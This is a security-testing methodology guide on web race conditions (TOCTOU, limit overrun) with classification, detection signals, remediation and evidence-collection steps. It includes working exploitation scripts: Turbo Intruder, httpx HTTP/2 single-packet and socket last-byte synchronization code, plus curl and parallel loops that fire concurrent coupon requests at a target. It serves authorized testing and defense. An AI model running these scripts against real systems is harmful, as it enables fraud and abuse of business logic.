# Race Condition Testing

## Overview
Race conditions occur when a system's behavior depends on the timing or sequence of uncontrollable events, such as concurrent HTTP requests. In web applications, these manifest as Time-of-Check to Time-of-Use (TOCTOU) flaws, limit overrun vulnerabilities, and state manipulation issues. Attackers exploit narrow timing windows by sending multiple simultaneous requests to bypass business logic, exhaust resources, or escalate privileges.

## Classification
- **CWE:** CWE-362 (Concurrent Execution Using Shared Resource with Improper Synchronization), CWE-367 (TOCTOU Race Condition)
- **OWASP:** A04:2021 - Insecure Design
- **CVSS Base:** 5.9 - 8.1

## Detection Methodology

### 1. Identify Race-Prone Functionality
Operations vulnerable to race conditions:
- Coupon / promo code redemption
- Balance transfers / payments
- Vote / like / rating submission
- Account registration (unique constraints)
- Invitation / referral code usage
- File upload processing
- Inventory / stock purchase
- API rate limiting checks
- Password reset token validation
- Session creation / rotation
- Two-factor authentication verification
- Email verification token consumption

### 2. Limit Overrun (Most Common)
Exploit race windows between "check" and "update" to exceed limits:

```
Normal flow:
1. Check: Does user have available balance/coupon?
2. Use: Deduct balance / mark coupon used
3. Act: Process transaction

Race attack:
Send N identical requests simultaneously
All N pass the "check" before any "update" completes
Result: Coupon used N times, balance deducted once but acted N times
```

### 3. Single-Packet Attack Technique (HTTP/2)
The most reliable race condition exploitation method. HTTP/2 multiplexing allows multiple requests in a single TCP packet, ensuring they arrive at the server simultaneously:

```python
# Using Turbo Intruder (Burp Extension)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    # Queue all requests
    for i in range(20):
        engine.queue(target.req, gate='race1')

    # Release all requests simultaneously via single packet
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

```python
# Python with httpx (HTTP/2 support)
import httpx
import asyncio

async def race_single_packet():
    async with httpx.AsyncClient(http2=True) as client:
        # Prepare all requests
        tasks = []
        for _ in range(20):
            tasks.append(
                client.post('https://target.com/apply-coupon',
                    data={'code': 'DISCOUNT50'},
                    cookies={'session': 'victim_session'})
            )
        # Fire simultaneously
        responses = await asyncio.gather(*tasks)
        for r in responses:
            print(r.status_code, r.text[:100])

asyncio.run(race_single_packet())
```

### 4. TOCTOU (Time-of-Check to Time-of-Use)
```
Example: Password reset race
1. Request password reset → token generated
2. Simultaneously: Use token AND request new token
3. Race window between token validation and invalidation

Example: File upload race
1. Upload file → server checks file type
2. Between check and rename/move, access file at temporary path
3. Execute uploaded file before server sanitizes it
```

### 5. Multi-Endpoint Race Conditions
```
Example: Balance transfer
Thread A: POST /transfer (from: account1, to: account2, amount: 1000)
Thread B: POST /transfer (from: account1, to: account3, amount: 1000)
Both threads read balance=1000, both proceed, total deducted=2000 from balance of 1000
```

### 6. HTTP/1.1 Last-Byte Synchronization
When HTTP/2 is unavailable, synchronize HTTP/1.1 requests using the last-byte technique:

```python
# Send all requests except the last byte
# Then send all final bytes simultaneously

import socket
import threading

def prepare_request(host, port, request_data):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    # Send everything except last byte
    s.send(request_data[:-1])
    return s

# Prepare N connections
sockets = []
for i in range(20):
    s = prepare_request('target.com', 80, request_bytes)
    sockets.append(s)

# Release last byte on all connections simultaneously
barrier = threading.Barrier(len(sockets))
def send_last_byte(sock, last_byte):
    barrier.wait()
    sock.send(last_byte)

threads = [threading.Thread(target=send_last_byte, args=(s, request_bytes[-1:]))
           for s in sockets]
for t in threads:
    t.start()
for t in threads:
    t.join()
```

### 7. Detection Signals
```
Indicators of a successful race condition:
- Multiple success responses (e.g., "Coupon applied") for single-use operations
- Database inconsistency (balance < 0, duplicate entries)
- Multiple confirmation emails for single operation
- Resource created multiple times despite uniqueness constraint
- HTTP 200 on multiple requests where only one should succeed
```

## Tool Usage
```bash
# Turbo Intruder (Burp Extension) - preferred tool
# Use single-packet-attack template from Extensions → Turbo Intruder

# curl parallel requests (basic, imprecise timing)
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://target.com/apply-coupon \
    -d "code=DISCOUNT50" \
    -H "Cookie: session=abc123" &
done
wait

# GNU Parallel for better synchronization
seq 1 20 | parallel -j 20 curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST https://target.com/apply-coupon \
  -d "code=DISCOUNT50" -H "Cookie: session=abc123"

# Nuclei race condition templates
nuclei -u https://target.com -t race/ -race-count 20 -batch
```

## Remediation
1. **Database-level locking** -- use `SELECT ... FOR UPDATE`, row-level locks, or advisory locks
2. **Atomic operations** -- use database atomic increments (`UPDATE SET count = count - 1 WHERE count > 0`)
3. **Idempotency keys** -- require unique request identifiers, reject duplicates
4. **Optimistic locking** -- version columns with `WHERE version = expected_version`
5. **Redis/distributed locks** -- use SETNX or Redlock for distributed systems
6. **Queue-based processing** -- serialize operations through a message queue
7. **Unique constraints** -- database-level uniqueness for one-time-use tokens
8. **Transaction isolation** -- use SERIALIZABLE isolation level for critical operations

## Evidence Collection
- Number of simultaneous requests sent and success count
- Multiple success responses for single-use operations
- Database state showing inconsistency (duplicate records, negative balances)
- Timing details (request timestamps, response times)
- Business logic impact (financial loss, bypassed limits)
- HTTP request/response pairs for each concurrent request
- Reproduction steps with exact timing methodology used
- Impact assessment (monetary value, scope of bypass)
